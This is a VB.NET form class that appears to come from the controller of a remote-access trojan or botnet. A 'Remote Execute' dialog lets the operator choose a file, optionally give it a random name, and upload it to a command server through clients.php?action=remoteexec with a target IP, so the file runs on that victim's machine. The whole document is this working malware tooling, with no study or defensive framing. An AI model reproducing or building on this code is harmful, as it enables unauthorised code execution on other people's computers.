Imports System.Text
Imports System.IO
Imports System.Net

Public Class RemoteDownload
    Public targetIp As String = ""

    Private Sub remotedownload_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Text = "Remote Execute @ " & targetIp
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim result As DialogResult = OpenFileDialog1.ShowDialog()

        If result = Windows.Forms.DialogResult.OK Then
            TextBox1.Text = OpenFileDialog1.FileName
            Button2.Enabled = True
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim fpath As String = OpenFileDialog1.FileName
        Dim extension As String = Path.GetExtension(fpath)
        If CheckBox1.Checked = True Then
            Dim s As String = "abcdefghijklmnopqrstvuwxyz"
            Dim r As New Random : Dim sb As New StringBuilder
            For i As Integer = 1 To 12
                Dim idx As Integer = r.Next(0, 26)
                sb.Append(s.Substring(idx, 1))
            Next
            Dim filename As String = sb.ToString() & extension
            Dim fileupload As New WebClient
            fileupload.UploadFile(My.Settings.vpsurl & "clients.php?action=remoteexec&target=" & targetIp & "&actioncontent=" & filename, fpath)
        Else
            Dim fileupload As New WebClient
            Dim filename As String = System.IO.Path.GetFileName(fpath)
            fileupload.UploadFile(My.Settings.vpsurl & "clients.php?action=remoteexec&target=" & targetIp & "&actioncontent=" & filename, fpath)
        End If
        MessageBox.Show("Succesfully Send !")
    End Sub
End Class